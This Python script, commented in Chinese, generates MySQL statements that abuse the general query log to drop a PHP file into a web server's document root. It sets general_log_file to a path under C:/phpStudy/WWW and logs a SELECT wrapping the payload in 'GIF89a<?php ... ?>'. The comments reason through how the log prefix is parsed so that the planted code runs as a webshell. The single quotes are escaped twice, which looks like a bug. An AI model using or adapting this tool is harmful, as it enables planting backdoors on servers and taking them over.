#!/usr/bin/env python3
"""gen_upload_sql.py - 生成SQL: 通过general_log上传任意PHP文件
原理: general_log会记录每条SQL文本; 用SELECT '内容'把文件逐行写入
但日志有前缀格式, 所以用 '/*行内容*/' 方式让日志行成为合法PHP注释
更稳: 文件内容拆成多行, 每行用 SELECT '内容' 写入, 内容用 'GIF89a<?php ... ?>//' 包裹
"""
import sys

def gen_sql(php_path, target_name):
    with open(php_path, 'r', encoding='utf-8') as f:
        content = f.read()
    # 转义单引号
    content = content.replace("'", "''")
    lines = []
    lines.append("SET GLOBAL general_log = OFF;")
    lines.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/%s';" % target_name)
    lines.append("SET GLOBAL general_log = ON;")
    # 每行内容作为一条SELECT (会触发语法错误但错误文本被记录)
    # 用?php标记: 第一行写入GIF头+<?php, 用/*注释掉日志前缀
    # 日志格式: <时间戳> <id> Query\tSELECT '内容'
    # 所以PHP行需要: 前缀被/*注释, 内容在<?php ?>内, 后缀被//注释
    # 实际写入行: <prefix>\tSELECT '内容'
    # PHP解析: <prefix>\tSELECT '内容' - 不是合法PHP
    # 解法: 内容用 '<?php /*' 开头? 不行
    # 换思路: 用 -- 注释吃掉前缀?
    # 最佳: 内容= '//前缀注释\n<?php 代码 ?>'
    # 但general_log每行独立, 前缀在行首
    # 所以: 行首<prefix>SELECT '<?php 代码 ?>' - PHP把<prefix>SELECT当作文本输出? 不, <prefix>含'2026-08-12...'不是PHP
    # 只有 <?php 之后才是PHP代码; 之前的都是HTML输出
    # 所以整个文件: <prefix1>SELECT '<?php 代码1 ?>'<prefix2>SELECT '<?php 代码2 ?>'
    # PHP解析: 先输出HTML(prefix1 SELECT '), 遇到<?php执行代码1, 然后?>后输出HTML... 
    # 关键: 如果第一行就有<?php ... ?>完整代码, 之后的行都是HTML(不影响)
    # 所以: 把所有PHP代码放一行! 文件扫描器脚本很小, 可以合并成一行
    one_line = content.replace('\n', ' ').replace('\r', ' ')
    sql_line = "SELECT 'GIF89a<?php %s ?>//'" % one_line.replace("'", "''")
    lines.append(sql_line)
    lines.append("SET GLOBAL general_log = OFF;")
    return '\n'.join(lines) + '\n'

if __name__ == '__main__':
    php = sys.argv[1]
    target = sys.argv[2]
    print(gen_sql(php, target))
